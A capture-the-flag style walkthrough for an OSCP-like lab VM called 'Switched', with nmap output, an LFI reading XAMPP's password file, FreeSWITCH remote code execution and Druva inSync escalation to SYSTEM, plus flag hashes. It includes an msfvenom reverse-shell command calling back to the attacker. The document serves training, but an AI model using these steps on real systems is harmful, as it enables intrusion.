![](assets/images/header.png)



<img src="assets/images/htb.png" style="margin-left: 20px; zoom: 60%;" align=left />    	<font size="10">Machine Name</font>

​		DD<sup>th</sup> Month YYYY

​		Machine Creator(s): 

​		

 



### Description:

This machine...

### Difficulty:

`easy`

### Flags:

User: `<md5>`

Root: `<md5>`

# Enumeration



# Foothold



# Lateral Movement



# Privilege Escalation


<!-- Output copied to clipboard! -->


<p style="color: red; font-weight: bold">>>>>>  gd2md-html alert:  ERRORs: 0; WARNINGs: 0; ALERTS: 12.</p>
<ul style="color: red; font-weight: bold"><li>See top comment block for details on ERRORs and WARNINGs. <li>In the converted Markdown or HTML, search for inline alerts that start with >>>>>  gd2md-html alert:  for specific instances that need correction.</ul>

<p style="color: red; font-weight: bold">Links to alert messages:</p><a href="#gdcalert1">alert1</a>
<a href="#gdcalert2">alert2</a>
<a href="#gdcalert3">alert3</a>
<a href="#gdcalert4">alert4</a>
<a href="#gdcalert5">alert5</a>
<a href="#gdcalert6">alert6</a>
<a href="#gdcalert7">alert7</a>
<a href="#gdcalert8">alert8</a>
<a href="#gdcalert9">alert9</a>
<a href="#gdcalert10">alert10</a>
<a href="#gdcalert11">alert11</a>
<a href="#gdcalert12">alert12</a>

<p style="color: red; font-weight: bold">>>>>> PLEASE check and correct alert issues and delete this message and the inline alerts.<hr></p>




<p id="gdcalert1" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image1.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert2">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image1.png "image_tooltip")


<span style="text-decoration:underline;">Machine Name</span>

Switched

​ 09 july 2020

​ <span style="text-decoration:underline;">Machine Creator(s):</span>

v1n1v131r4

<span style="text-decoration:underline;">Description:</span>

This machine was developed as OSCP-Like and can serve as a preparation for those who are training for this certification. All vulnerabilities implemented are recent.

It was developed with fixed IP (192.168.56.106) and does not require vhost and/or DNS settings

<span style="text-decoration:underline;">Difficulty:</span>

medium

<span style="text-decoration:underline;">Flags:</span>

**user = fc13ae7bdc07ba9c1c33ab6f4189ea53**

**root = 0b2708eb2ad6366f62e7bc375b8f0b8b**

Enumeration:

root@kali:/home/kali# nmap -sV -p 8021 -A 192.168.56.106

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 23:19 EDT

Nmap scan report for 192.168.56.106

Host is up (0.00056s latency).

PORT 	STATE SERVICE      	VERSION

8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket

MAC Address: 08:00:27:7C:55:00 (Oracle VirtualBox virtual NIC)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%), Microsoft Windows 7 Enterprise SP1 (92%), Microsoft Windows 8 (92%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 1 hop

TRACEROUTE

HOP RTT 	ADDRESS

1   0.56 ms 192.168.56.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 4.63 seconds

root@kali:/home/kali#

root@kali:/home/kali# nmap -sV -p- -A 192.168.56.106

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 23:39 EDT

Stats: 0:04:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan

SYN Stealth Scan Timing: About 79.35% done; ETC: 23:45 (0:01:13 remaining)

Nmap scan report for 192.168.56.106

Host is up (0.00056s latency).

Not shown: 65515 closed ports

PORT  	STATE SERVICE      	VERSION

21/tcp	open  ftp          	FileZilla ftpd 0.9.41 beta

| ftp-syst:

|_  SYST: UNIX emulated by FileZilla

80/tcp	open  http         	Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.31)

| http-methods:

|_  Potentially risky methods: TRACE

|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.31

|_http-title: Switched

135/tcp   open  msrpc        	Microsoft Windows RPC

139/tcp   open  netbios-ssn  	Microsoft Windows netbios-ssn

443/tcp   open  ssl/http     	Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.31)

| http-methods:

|_  Potentially risky methods: TRACE

|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.31

|_http-title: Switched

| ssl-cert: Subject: commonName=localhost

| Not valid before: 2009-11-10T23:48:47

|_Not valid after:  2019-11-08T23:48:47

|_ssl-date: TLS randomness does not represent time

| tls-alpn:

|_  http/1.1

445/tcp   open  microsoft-ds?

3306/tcp  open  mysql?

| fingerprint-strings:

|   NULL:

|_	Host '192.168.56.103' is not allowed to connect to this MariaDB server

5040/tcp  open  unknown

5357/tcp  open  http         	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0

|_http-title: Service Unavailable

5985/tcp  open  http         	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0

|_http-title: Not Found

7680/tcp  open  pando-pub?

8021/tcp  open  freeswitch-event FreeSWITCH mod_event_socket

47001/tcp open  http         	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0

|_http-title: Not Found

49664/tcp open  msrpc        	Microsoft Windows RPC

49665/tcp open  msrpc        	Microsoft Windows RPC

49666/tcp open  msrpc        	Microsoft Windows RPC

49667/tcp open  msrpc        	Microsoft Windows RPC

49668/tcp open  msrpc        	Microsoft Windows RPC

49669/tcp open  msrpc        	Microsoft Windows RPC

49674/tcp open  msrpc        	Microsoft Windows RPC

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port3306-TCP:V=7.80%I=7%D=7/8%Time=5F0692D4%P=x86_64-pc-linux-gnu%r(NUL

SF:L,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.56\.103'\x20is\x20not\x20all

SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");

MAC Address: 08:00:27:7C:55:00 (Oracle VirtualBox virtual NIC)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.80%E=4%D=7/8%OT=21%CT=1%CU=42222%PV=Y%DS=1%DC=D%G=Y%M=080027%TM

OS:=5F069386%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=2%ISR=10D%TI=I%CI=I%II=I%

OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5

OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)

OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%

OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=

OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%

OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=

OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=

OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%

OS:T=80%CD=Z)

Network Distance: 1 hop

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host  results:

|_clock-skew: -2s

|_nbstat: NetBIOS name: DESKTOP-U5E0RVF, NetBIOS user: &lt;unknown>, NetBIOS MAC: 08:00:27:7c:55:00 (Oracle VirtualBox virtual NIC)

| smb2-security-mode:

|   2.02:

|_	Message signing enabled but not required

| smb2-time:

|   date: 2020-07-09T03:48:04

|_  start_date: N/A

TRACEROUTE

HOP RTT 	ADDRESS

1   0.56 ms 192.168.56.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 538.23 seconds

Durinng enumeration i founded XAMPP running on target:



<p id="gdcalert2" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image2.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert3">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image2.png "image_tooltip")


On Port 80/TCP i found the Switched Web Site running. And on Contacts page, i founded a LFI vulnerability:



<p id="gdcalert3" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image3.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert4">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image3.png "image_tooltip")


With this vulnerability is possible to read **passwords.txt** XAMPP file (c:\xampp\passwords.txt):



<p id="gdcalert4" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image4.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert5">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image4.png "image_tooltip")


On this file is possible found FreeSwitch password:

**L33tm3In_0n_F1r3**

Foothold:

According to this exploit [https://www.exploit-db.com/exploits/47799](https://www.exploit-db.com/exploits/47799) is possible arbitrarily execute remote commands on target with this version of FreeSwitch.

For this, i created a Meterpreter payload with Msfvenom:

**msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=443 -f exe > shell.exe**

And modified the FreeSwitch exploit to upload my payload:



<p id="gdcalert5" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image5.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert6">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image5.png "image_tooltip")


I opened a webserver with python and a multi handler with msfconsole. I edited the exploit again to execute the payload I had sent in the previous step:



<p id="gdcalert6" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image6.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert7">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image6.png "image_tooltip")


And got shell and user:



<p id="gdcalert7" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image7.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert8">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image7.png "image_tooltip")


Privilege Escalation:

During post-exploration I found Druva inSync running on the target. When searching the exploit-db I found this exploit for escalating local privileges: [https://www.exploit-db.com/exploits/48505](https://www.exploit-db.com/exploits/48505) 



<p id="gdcalert8" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image8.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert9">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image8.png "image_tooltip")


I generated a new payload with Msfvenom:



<p id="gdcalert9" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image9.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert10">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image9.png "image_tooltip")


And uploaded to target with **certutil.exe**



<p id="gdcalert10" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image10.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert11">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image10.png "image_tooltip")


Using the Druva inSync exploit founded on Exploit-db, I performed the payload generated by msfvenom and got a shell with **NT Authority\System** powers:



<p id="gdcalert11" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image11.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert12">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image11.png "image_tooltip")


And finally got root.txt



<p id="gdcalert12" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image12.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert13">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image12.png "image_tooltip")



